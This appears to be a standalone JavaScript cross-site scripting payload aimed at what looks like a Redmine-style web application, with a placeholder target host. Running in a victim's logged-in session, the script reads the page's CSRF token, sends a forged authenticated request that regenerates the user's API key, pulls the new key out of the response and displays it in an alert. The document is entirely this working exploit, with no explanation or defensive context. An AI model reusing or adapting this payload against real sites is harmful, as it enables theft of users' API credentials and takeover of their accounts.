(async () => { var csrf_param = document.querySelector('meta[name=csrf-param]').content; var csrf_token = document.querySelector('meta[name=csrf-token]').content; var req = await fetch("http://$IP/my/generate_api_key", { "credentials": "include", "headers": { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "de,en-US;q=0.7,en;q=0.3", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1" }, "referrer": "http://$IP/my/access_token", "body": "_method=post&" + csrf_param + "=" + encodeURI(csrf_token), "method": "POST", "mode": "cors" }); var resp = await req.text(); var regex = /(Your access token is:\<br \/\>\<strong\>)(.*)(\<\/strong\>)/gm; var api_key = resp.match(regex)[0]; api_key = api_key.slice(35, -9); alert("Generated new API key: " + api_key); })();
